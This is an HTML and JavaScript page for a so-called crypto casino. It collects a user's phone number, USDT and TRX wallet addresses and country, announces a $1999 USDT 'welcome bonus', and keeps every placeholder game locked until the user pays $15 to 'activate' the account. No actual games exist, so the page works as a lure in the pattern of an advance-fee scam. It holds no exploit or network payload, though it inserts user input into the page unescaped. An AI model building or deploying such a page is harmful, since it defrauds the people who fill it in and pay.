<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Crypto Casino Start</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: #a9e5ac;
      font-family: 'Segoe UI', Arial, sans-serif;
      margin: 0;
      padding: 0;
      color: #222;
    }
    .centered {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .start-btn {
      background: #23c16b;
      color: #fff;
      font-size: 1.3em;
      padding: 16px 48px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 4px 14px rgba(30,150,60,0.12);
      margin: 24px 0 0 0;
      transition: background .2s;
    }
    .start-btn:hover {
      background: #1aa95c;
    }
    .form-container {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 6px 24px rgba(50,150,100,0.14);
      padding: 32px;
      width: 350px;
      max-width: 100vw;
      animation: popup .4s;
    }
    @keyframes popup {
      from { transform: scale(.8); opacity: 0;}
      to { transform: scale(1); opacity: 1;}
    }
    .form-container input, .form-container select {
      width: 100%;
      padding: 12px;
      margin: 10px 0 18px 0;
      border-radius: 8px;
      border: 1px solid #cbe7cb;
      font-size: 1em;
      background: #f5fff5;
    }
    .form-container label {
      font-weight: 500;
      margin-bottom: 3px;
      display: block;
    }
    .form-container button {
      width: 100%;
      background: #23c16b;
      color: #fff;
      font-size: 1.1em;
      padding: 12px 0;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 3px 10px rgba(30,150,60,0.08);
      margin-top: 10px;
    }
    .home {
      padding: 32px 0;
      text-align: center;
      animation: fadein .5s;
    }
    @keyframes fadein {
      from { opacity: 0;}
      to { opacity: 1;}
    }
    .balance-section {
      background: #f8fff8;
      border-radius: 16px;
      margin: 22px auto;
      width: 320px;
      max-width: 95vw;
      box-shadow: 0 3px 12px rgba(0,0,0,0.07);
      padding: 24px 0 16px 0;
      position: relative;
    }
    .balance-section .emoji {
      font-size: 2.5em;
      position: absolute;
      right: 24px;
      top: 18px;
    }
    .main-balance {
      font-size: 2.3em;
      color: #18ad63;
      font-weight: 700;
      margin-bottom: 4px;
    }
    .bonus-point {
      font-size: 1.05em;
      color: #222;
      margin-bottom: 5px;
    }
    .games-section {
      margin: 42px 0;
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
      gap: 24px;
      width: 80vw;
      max-width: 700px;
      margin-left: auto;
      margin-right: auto;
    }
    .game-card {
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(30,150,60,0.12);
      padding: 18px 8px;
      text-align: center;
      position: relative;
      opacity: .7;
      cursor: not-allowed;
      border: 1.5px solid #f1c40f;
    }
    .game-card.locked::after {
      content: "ðŸ”’";
      position: absolute;
      top: 6px;
      right: 12px;
      font-size: 1.2em;
    }
    .game-card h3 {
      margin: 0;
      font-size: 1.08em;
      color: #18ad63;
      font-weight: 600;
    }
    .bonus-popup {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: rgba(30,150,60,0.11);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 100;
      animation: fadein .5s;
    }
    .bonus-popup-inner {
      background: #fff;
      border-radius: 18px;
      box-shadow: 0 8px 32px rgba(30,150,60,0.13);
      padding: 36px 28px;
      text-align: center;
      max-width: 90vw;
      width: 350px;
      animation: popup .3s;
    }
    .bonus-popup-inner h2 {
      color: #18ad63;
      font-size: 2em;
      margin: 0 0 10px 0;
    }
    .bonus-popup-inner .bonus-amount {
      font-size: 2.2em;
      color: #23c16b;
      font-weight: 800;
      margin-bottom: 12px;
    }
    .bonus-popup-inner button {
      margin-top: 24px;
      background: #23c16b;
      color: #fff;
      padding: 12px 38px;
      border: none;
      border-radius: 10px;
      font-size: 1.08em;
      cursor: pointer;
      box-shadow: 0 3px 10px rgba(30,150,60,0.09);
    }
    .usdt-img {
      width: 140px;
      margin-bottom: 14px;
      border-radius: 12px;
      box-shadow: 0 3px 14px rgba(60,200,100,0.10);
    }
    /* Scroll bar for country dropdown */
    select#country {
      max-height: 220px;
      overflow-y: auto;
    }
  </style>
</head>
<body>
  <div id="app"></div>

  <script>
    // Helper functions
    function saveUser(data) {
      localStorage.setItem('casinoUser', JSON.stringify(data));
    }
    function getUser() {
      return JSON.parse(localStorage.getItem('casinoUser') || 'null');
    }
    function clearPopup() {
      const popup = document.getElementById('bonus-popup');
      if (popup) popup.remove();
    }

    // All countries in the world
    const allCountries = [
      "Afghanistan","Albania","Algeria","Andorra","Angola","Antigua and Barbuda","Argentina","Armenia","Australia","Austria","Azerbaijan",
      "Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bhutan","Bolivia","Bosnia and Herzegovina","Botswana",
      "Brazil","Brunei","Bulgaria","Burkina Faso","Burundi","Cabo Verde","Cambodia","Cameroon","Canada","Central African Republic","Chad",
      "Chile","China","Colombia","Comoros","Congo","Costa Rica","Croatia","Cuba","Cyprus","Czechia","Denmark","Djibouti","Dominica",
      "Dominican Republic","Ecuador","Egypt","El Salvador","Equatorial Guinea","Eritrea","Estonia","Eswatini","Ethiopia","Fiji","Finland",
      "France","Gabon","Gambia","Georgia","Germany","Ghana","Greece","Grenada","Guatemala","Guinea","Guinea-Bissau","Guyana","Haiti",
      "Honduras","Hungary","Iceland","India","Indonesia","Iran","Iraq","Ireland","Israel","Italy","Jamaica","Japan","Jordan","Kazakhstan",
      "Kenya","Kiribati","Korea, North","Korea, South","Kosovo","Kuwait","Kyrgyzstan","Laos","Latvia","Lebanon","Lesotho","Liberia",
      "Libya","Liechtenstein","Lithuania","Luxembourg","Madagascar","Malawi","Malaysia","Maldives","Mali","Malta","Marshall Islands",
      "Mauritania","Mauritius","Mexico","Micronesia","Moldova","Monaco","Mongolia","Montenegro","Morocco","Mozambique","Myanmar","Namibia",
      "Nauru","Nepal","Netherlands","New Zealand","Nicaragua","Niger","Nigeria","North Macedonia","Norway","Oman","Pakistan","Palau",
      "Palestine","Panama","Papua New Guinea","Paraguay","Peru","Philippines","Poland","Portugal","Qatar","Romania","Russia","Rwanda",
      "Saint Kitts and Nevis","Saint Lucia","Saint Vincent and the Grenadines","Samoa","San Marino","Sao Tome and Principe","Saudi Arabia",
      "Senegal","Serbia","Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia","Solomon Islands","Somalia","South Africa","Spain",
      "Sri Lanka","Sudan","Suriname","Sweden","Switzerland","Syria","Taiwan","Tajikistan","Tanzania","Thailand","Timor-Leste","Togo",
      "Tonga","Trinidad and Tobago","Tunisia","Turkey","Turkmenistan","Tuvalu","Uganda","Ukraine","United Arab Emirates","United Kingdom",
      "United States","Uruguay","Uzbekistan","Vanuatu","Vatican City","Venezuela","Vietnam","Yemen","Zambia","Zimbabwe"
    ];

    // Games List Sample
    const games = Array.from({length: 15}, (_, i) => ({
      name: `Game ${i+1}`,
      locked: true
    }));

    const app = document.getElementById('app');

    // Initial View
    function showStart() {
      app.innerHTML = `
        <div class="centered">
          <img src="casino-crypto.png" class="usdt-img" alt="Casino Crypto" />
          <button class="start-btn" id="startBtn">START</button>
        </div>
      `;
      document.getElementById('startBtn').onclick = showRegisterForm;
    }

    // Registration Form
    function showRegisterForm() {
      app.innerHTML = `
        <div class="centered">
          <div class="form-container">
            <h2 style="margin-bottom:16px;">Create Account</h2>
            <label>Game Name</label>
            <input type="text" id="gameName" placeholder="Your Game Name" required>
            <label>Phone Number</label>
            <input type="text" id="phoneNum" placeholder="e.g. +1234567890" required>
            <label>USDT Address</label>
            <input type="text" id="usdtAddr" placeholder="Your USDT Address" required>
            <label>TRX Address</label>
            <input type="text" id="trxAddr" placeholder="Your TRX Address" required>
            <label>Country</label>
            <select id="country">
              <option value="">Select Country</option>
              ${allCountries.map(c => `<option value="${c}">${c}</option>`).join('')}
              <option value="other">Country not listed? Type here</option>
            </select>
            <input type="text" id="countryInput" placeholder="Type your country" style="display:none;" />
            <div id="countryNotify" style="color:#e74c3c;margin-bottom:8px;display:none;font-size:0.98em;"></div>
            <button id="continueBtn">Continue</button>
          </div>
        </div>
      `;
      const countrySelect = document.getElementById('country');
      const countryInput = document.getElementById('countryInput');
      countrySelect.onchange = function() {
        if (countrySelect.value === "other") {
          countryInput.style.display = "block";
        } else {
          countryInput.style.display = "none";
        }
      };
      document.getElementById('continueBtn').onclick = function() {
        let selectedCountry = countrySelect.value;
        if (selectedCountry === "other") {
          selectedCountry = countryInput.value.trim();
          if (!selectedCountry) {
            document.getElementById('countryNotify').innerText = "Please enter your country.";
            document.getElementById('countryNotify').style.display = "block";
            return;
          } else {
            document.getElementById('countryNotify').style.display = "none";
          }
        } else if (!selectedCountry) {
          document.getElementById('countryNotify').innerText = "Please select your country.";
          document.getElementById('countryNotify').style.display = "block";
          return;
        } else {
          document.getElementById('countryNotify').style.display = "none";
        }
        const user = {
          gameName: document.getElementById('gameName').value.trim(),
          phoneNum: document.getElementById('phoneNum').value.trim(),
          usdtAddr: document.getElementById('usdtAddr').value.trim(),
          trxAddr: document.getElementById('trxAddr').value.trim(),
          country: selectedCountry,
          mainBalance: 0,
          bonus: 1999,
          started: true
        };
        if (!user.gameName || !user.phoneNum || !user.usdtAddr || !user.trxAddr) {
          alert("Please fill all fields.");
          return;
        }
        saveUser(user);
        showHome();
        setTimeout(showBonusPopup, 900);
      };
    }

    // Home Page
    function showHome() {
      const user = getUser();
      app.innerHTML = `
        <div class="home">
          <h1 style="font-weight:700;font-size:1.7em;">Welcome, ${user.gameName}!</h1>
          <div class="balance-section">
            <div class="main-balance">$${user.mainBalance.toFixed(2)} <span style="font-size:0.7em;">USDT</span></div>
            <div class="emoji">ðŸ˜ž</div>
            <div class="bonus-point">
              <b>Bonus Point:</b> <span style="color:#f1c40f;font-weight:700;">$${user.bonus} USDT</span>
              <br>
              <span style="font-size:0.98em;color:#888;">You need $15 to activate your account.</span>
            </div>
          </div>
          <div>
            <h2 style="margin-top:38px;">Casino Games</h2>
            <div class="games-section">
              ${games.map(g => `
                <div class="game-card locked">
                  <h3>${g.name}</h3>
                  <div style="color:#bc6c25;font-size:0.95em;">Locked ($15 req)</div>
                </div>`).join('')}
            </div>
          </div>
        </div>
      `;
    }

    // Bonus Popup
    function showBonusPopup() {
      if (document.getElementById('bonus-popup')) return;
      const popup = document.createElement('div');
      popup.className = 'bonus-popup';
      popup.id = 'bonus-popup';
      popup.innerHTML = `
        <div class="bonus-popup-inner">
          <h2>ðŸŽ‰ Congratulations!</h2>
          <div class="bonus-amount">$1999 USDT</div>
          <div style="margin-bottom:12px;">Your Welcome Bonus has been credited to your Bonus Points.<br>
            <span style="color:#888;">You need $15 to start playing games.</span>
          </div>
          <button onclick="clearPopup()">OK</button>
        </div>
      `;
      document.body.appendChild(popup);
    }

    // App Logic: Show Start or Home depending on login
    window.onload = () => {
      const user = getUser();
      if (!user || !user.started) showStart();
      else showHome();
    }
  </script>
</body>
</html>
